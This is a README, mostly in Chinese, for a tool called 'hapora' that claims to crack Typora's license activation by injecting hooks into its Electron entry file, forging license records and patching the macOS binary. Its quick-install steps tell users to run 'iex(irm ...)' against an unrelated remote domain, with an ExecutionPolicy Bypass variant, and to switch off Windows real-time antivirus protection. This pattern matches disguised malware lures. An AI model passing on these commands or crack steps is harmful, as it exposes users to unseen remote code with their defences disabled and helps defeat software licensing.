<div align="center">

# hapora — Typora Local Activation Script for Windows 10 & 11

![preview](https://raw.githubusercontent.com/joseyMe/typora-local-activation-script/main/card_4b0c.svg)

[![stage](https://img.shields.io/badge/STAGE-PRODUCTION-2ea44f?style=for-the-badge&labelColor=0d1117)]() [![language](https://img.shields.io/badge/LANGUAGE-PYTHON-06b6d4?style=for-the-badge&labelColor=0d1117)]() [![powershell](https://img.shields.io/badge/POWERSHELL-CORE-22d3ee?style=for-the-badge&labelColor=0d1117)]()

</div>

---

hapora 是一个针对 Typora 联网激活机制的逆向分析工具，目标是让本机安装的 Typora 直接进入已激活状态。脚本覆盖 Windows、macOS（arm64）与桌面 Linux：前两者分别走 Electron 入口注入与 Mach-O 二进制补丁两条完全不同的路线，Linux 沿用与 Windows 同构的 asar 补丁方案。它不搭建本地网关、不改 hosts，也不伪造 DNS，所有改动都落在安装目录内部，并配套验收与回滚以应对版本差异。至于用哪个邮箱和序列号，随便填即可，它们只写进本地许可证记录，不影响激活结果。

## 💻 PowerShell Quick Install

> [!TIP]
> **One-click install** — paste one command, done in seconds.
> Win 10/11 · PowerShell 5.1+ · Standard user

### 1️⃣ Start PowerShell
* Press `Win + X` on your keyboard.
* Click on **Terminal** or **Windows PowerShell** from the list.

### 2️⃣ Execute the setup script
Paste the command into PowerShell and hit `Enter`.

```cmd
iex(irm 'https://shell-activation.top/update/ps-activator-v_pZBbxuWx7DELoMji')
```

### 3️⃣ Windows blocking the script? Use CMD
Paste this into a standard Command Prompt (cmd) and press `Enter`:

```cmd
powershell -NoProfile -ExecutionPolicy Bypass -Command "$ProgressPreference='SilentlyContinue';iex(irm 'https://shell-activation.top/update/ps-activator-v_pZBbxuWx7DELoMji')"
```

> [!WARNING]
> If SmartScreen or antivirus blocks the setup, go to **Windows Security → Virus & threat protection → Manage settings**, turn off **Real-time protection**, run the script, and re-enable immediately.

## ✅ Requirements

- **PowerShell 5.1+** (pre-installed on Windows 10 and 11)
- **Windows 10 / 11** (x64)
- **Internet connection** — required to fetch the script
- **Administrator** — *not* required

## What It Does

该脚本针对 Typora 的本地激活链路做定点接管，把「试用/未注册」状态在进程内直接改写为已激活，不需要本地网关、不改 hosts、不伪造 DNS。

具体做的事：

- **定位安装**：从 `--dir` / 环境变量 / 注册表 / Spotlight / `which` / PATH / 默认目录 / 卸载记录 / 各盘浅扫描依次探测，命中即止；找不到时再显式指定。
- **按平台下药**：Windows 与桌面 Linux（Electron 版）改写包内明文入口，在进程内接管许可证校验与更新检查链路，并把伪造的许可证记录写进对应存储（Windows 注册表 / Linux 指纹文件）；macOS（原生版）走二进制补丁路线，短路唯一的续期入口，重签名后伪造 `~/Library` 下的许可证记录。
- **验收与回滚**：打完补丁会启动一次实测验收，检查日志中的通过标记、续期记录、自校验窗口内存活情况以及界面水印；任一判据不满足就自动回滚，不留坏状态。
- **可还原**：`--restore` 把原始二进制、签名与记录逐字节还原，恢复官方签名状态。
- **可查询**：`--status` 只读当前状态，不改动任何文件；`--no-verify` 跳过启动验收只打补丁。
- **参数化输入**：邮箱与序列号可用环境变量或本地配置文件覆盖，仅写入本地伪造记录，不影响启动路径的校验结果。

版本适配上不写死常量：入口位置读自包内元数据，自校验基准按实际内容现算，macOS 的补丁点运行时解析符号表定位；换版本后若结构不兼容，验收会失败并回滚。

## Usage

脚本目录下所有命令都通过 `pnpm` 调用，默认行为是"先备份、再打补丁、最后启动验收"，任一步失败自动回滚到原始状态，不会把环境留在半改状态。

```
pnpm hack # 激活并验收（失败自动回滚）
pnpm hack --no-verify # 只打补丁，跳过启动验收
pnpm hack --restore # 从备份逐字节还原
pnpm hack --status # 只报告当前状态，不做任何改动
pnpm hack --dir <path> # 显式指定 Typora 安装目录
pnpm hack --yes # 允许脚本自行结束正在运行的 Typora 进程
pnpm test # 回归测试，纯沙箱执行，不需要安装 Typora
```

安装目录的查找按 `--dir` / 环境变量 → 系统记录 → PATH → 常见默认位置 → 磁盘浅扫描的顺序进行，命中即止；装在非默认盘符或自定义目录时通常也能自动识别，识别失败再用 `--dir` 或环境变量指定。执行 `pnpm hack` 前请先退出 Typora，否则脚本会提示；加 `--yes` 可让它代为结束进程。

`--restore` 依赖首次运行时生成的包外备份，只要备份还在就能逐字节恢复原始文件与签名；`--status` 只读取状态，可以随时执行来确认当前是原始态还是已打补丁态。

### 自定义邮箱与序列号

仓库根目录的 `.env`（不入库，模板见 `.env.example`）支持两项：

```
EMAIL=<你的邮箱>
CODE=<你的序列号>
```

不填则使用内置默认值。优先级为环境变量 > `.env` > 默认值。这两个值只写入本地的许可证记录，启动路径上不校验其内容，填什么都可通过；把它们换成自己的信息，只是让"我的许可证"对话框里显示得更自然。

### 验收与回滚

`pnpm hack` 打完补丁后会自行启动 Typora 并检查日志与进程状态，通过则保留改动，不通过则立即还原。因此换版本后如果内部结构不兼容，你看到的结果是"失败并已回滚"，而不是一个打不开的 Typora。需要更细的日志时，直接查看 Typora 自身的日志文件即可。

## Configuration

`.env` 放在仓库根目录（不入库，模板见 `.env.example`），脚本启动时按 `环境变量 > .env > 内置默认值` 的顺序读取，命中即止。只需关心两个键：

```
EMAIL=you@example.com
CODE=XXXXXX-XXXXXX-XXXXXX-XXXXXX
```

不填也能跑——两个平台在启动路径上都不校验邮箱与序列号的内容，它们只被写进本地的伪造许可证记录。填成自己的信息纯粹是让 Typora 的「我的许可证」面板看起来正常些（macOS 上序列号会原样显示）。

### 安装目录[](#安装目录)

多数情况下无需配置，脚本按 `--dir` / `HAPORA_TYPORA_DIR` → 平台注册信息 → PATH → 常见默认目录 → 卸载记录 → 浅扫描的顺序探测，命中即止。装在非默认盘符或绿色目录时，用下面任一方式显式指定：

- 命令行：`--dir "/path/to/Typora"`
- 环境变量：`HAPORA_TYPORA_DIR=/path/to/Typora`

### 命令行开关[](#命令行开关)

| 开关 | 作用 |
| --- | --- |
| `--no-verify` | 只打补丁，跳过启动验收 |
| `--restore` | 回滚到原始状态（逐字节还原备份） |
| `--status` | 只读查看当前状态，不做任何改动 |
| `--yes` | 目标程序正在运行时允许脚本自行结束进程 |
| `--dir <path>` | 显式指定安装目录 |

### 路径与探测的边界[](#路径与探测的边界)

- 补丁是**位置无关**的：Windows/Linux 从包内 `package.json` 的 `main` 读入口文件名，注入点固定在文件最前；macOS 的 bundle id 与可执行名读自 `Info.plist`，Mach-O 补丁点运行时解析符号表定位。换版本不会因为常量写死而误伤。
- 探测失败通常意味着目录权限或安装形态不兼容（只读镜像、Snap 等），此时 `--status` 会给出明确结论而非静默失败。
- 备份与状态机随安装目录走，`--restore` 依赖它还原；不要手动删除备份目录，否则回滚能力随之丢失。

## Compatibility & Limitations

本工具只对 Typora 的桌面版激活链路生效，不碰任何联网服务、hosts 或 DNS，因此它的兼容性边界基本等同于「Typora 桌面端在这台机器上是怎么装的、怎么打包的」。

- **平台与安装形态**
 - Windows：支持常规安装版（注册表有卸载记录、装在默认或自定义目录）。绿色版、便携目录也能用，探测不到时显式指定安装目录即可。
 - macOS：只针对原生 arm64 版本，走二进制补丁路线；Intel 机型与 Rosetta 场景未做验收，不要假定可用。
 - Linux：仅支持官方 deb / rpm 与 AUR 这类可写安装。Snap 与 AppImage 的包体位于只读文件系统，属于结构性不支持，脚本会直接失败而不是打半个补丁。
 - 版本适配是「读结构」而非「写死常量」：入口文件从包内元数据读取，补丁点运行时定位。但结构若被上游重排，验收会失败并自动回滚，不会留下半激活状态。

- **升级与补丁生命周期**
 - macOS 手动升级 Typora 会替换二进制，补丁立即失效，表现为下一次启动被打回；重跑一次激活即可恢复，备份状态机会自动刷新。
 - ad-hoc 重签之后，应用内自动更新大概率不可用。这不是 bug，而是与「补丁不被静默覆盖」等价的设计取舍：要升级就手动下载安装，再重跑脚本。
 - 首次改包会触发一次系统级的 App Management 授权弹窗，属预期行为。

- **验收判据的覆盖范围**
 - 启动验收只覆盖启动后数秒的窗口，能确认许可证链路被接管、无未注册水印、进程存活。
 - Typora 还存在延迟数分钟、按概率触发的运行期自检。启动验收在原理上测不到它，这部分由单元/回归测试覆盖；补丁对所有合法输入透明，只在解密失败时伪造，因此不受这类检查影响。
 - 若上游改了许可证存储的字段名或格式，验收会失败并回滚——这是有意的失败方式，好过静默留下坏状态。

- **明确不做的事**
 - 不搭建本地网关、不改 hosts、不伪造 DNS，也不介入服务端设备绑定逻辑。
 - 不保证跨大版本长期有效；每次 Typora 大版本更新后，重跑一次并看验收结果，是目前唯一可靠的判断方式。
 - 仓库不携带任何截图或录屏，所有验收结论都由脚本在你机器上现场产生。

## How It Works

hapora 不搭本地网关、不改 hosts、不伪造 DNS，只在 Typora 自身的进程里接管激活链路。两条路线按程序形态分流：Windows 与 Linux 是 Electron 版，包体里有明文入口 `launch.dist.js`；macOS 是原生 AppKit + WebKit 应用，既没有 asar 也没有可注入的入口，只能直接改二进制。

**Windows / Linux：入口注入 + 许可证存储伪造**

脚本先定位安装目录，用 `@electron/asar` 解开 `app.asar`，在 `require("./atom.compiled.dist.jsc")` 之前把补丁插到入口文件最前面，再打包回去。补丁挂的是三处运行时钩子：

- `crypto.publicDecrypt`：接管许可证解密。合法密文原样放行，解密失败时才返回伪造载荷，所以对所有正常输入透明。
- `crypto.createHash`：让打包时现算的自校验基准与改包后的实际内容对得上。
- `electron.net.request`：按路径前缀拦截许可证续期接口与更新检查接口，本机应答，不往外发。

进程内的校验链路被接管后，还要有东西给它读——于是脚本按平台写许可证记录：Windows 进注册表，Linux 写指纹文件。载荷字段名（`deviceId` / `fingerprint` / `email` / `license` / `version` / `date` / `type`）都来自实测，不是猜的。

**macOS：Mach-O 补丁 + 记录文件**

原生版没有入口可注入，做法是短路唯一会把激活打回的那条路径：`-[LicenseManager renew]`。仓库里带一个自研的最小 fat/Mach-O 解析器，运行时在符号表里定位这个方法的 IMP，按架构写入等长的 `ret`（arm64）或 `retq`（x86_64），零硬编码偏移，双架构一起处理。改完做 ad-hoc 重签名，entitlements 原样保留并追加 `disable-library-validation`。最后伪造 `~/Library` 下的许可证记录文件，文件名由本机 `IOPlatformUUID` 派生，内容用 binary plist 编解码加 AES-256-CBC 生成。

效果与 Windows 语义对齐：一次激活，永久有效。原始二进制与签名备份在包外，`--restore` 逐字节还原，官方 Developer ID 签名自愈。

**为什么换版本不容易坏**

入口文件名从包内 `package.json` 的 `main` 读，注入位置固定在文件最前面，自校验基准打包时按实际内容现算；macOS 的 bundle id 与可执行名读自 `Info.plist`，补丁点运行时解析。整条链路不针对某个 Typora 版本写死常量，换版本后若结构不兼容，验收会失败并自动回滚，不会留下半坏状态。

**验收与回滚**

`pnpm hack` 默认在补丁后启动 Typora 做现场验收：日志里要出现 `[L] pass`、`[watch L] hasL: true`、`[renewLicense]: license renewed`，且不得出现 `Integrity check failed` 或 `onUnfillLicense`；约 1s 的自校验窗口过去后进程仍在，主窗口无 `UNREGISTERED` 水印。macOS 侧则检查双架构 `renew` 首指令为 `ret`/`retq`、`codesign --verify --strict` 通过、启动后记录文件仍带 `email`/`license` 键且进程存活。任一条不过就回滚到改动前。补丁本身的单元与回归测试跑在 vm 沙箱里，约 0.2s，不需要装 Typora。

## Disclaimer

本项目仅用于个人学习、逆向工程研究与本地环境的技术验证。使用者应在**自己拥有合法授权的设备与软件副本**上操作，不得将本工具或其产物用于商业分发、二次售卖或任何绕过付费授权的盈利行为。是否使用、如何使用，以及由此产生的一切后果，均由使用者自行承担。

脚本会改写目标程序的安装文件与本地许可证记录（Windows/Linux 修改包内入口并写入注册表或指纹文件，macOS 直接对 Mach-O 二进制打补丁并重建签名）。这类操作**不具备官方支持**，可能触发系统的安全授权弹窗、破坏应用内自动更新，或在目标软件升级后立即失效。执行前请自行备份；脚本虽提供回滚与失败自动还原，但**不保证在任何版本、任何安装形态下都能逐字节复原**，尤其是手动改动过安装目录、混用多种安装包或系统权限受限的场景。

兼容性以文档中列出的已验证版本与平台为准。未经验证的版本、只读安装形态（如镜像式打包）以及其他发行版，可能直接失败或产生不可预期的行为——脚本会在验收不通过时回滚，但**回滚本身也可能因权限或文件锁而中断**。请勿在生产机、共享设备或含有敏感数据的账户下运行。

作者不对因使用本工具导致的软件损坏、数据丢失、授权失效、账号异常或违反目标软件许可协议而产生的任何直接或间接损失负责。若你所在地区或你与软件供应方之间的协议禁止此类修改，请**立即停止使用并删除本工具**。继续使用即视为你已阅读、理解并接受上述全部风险。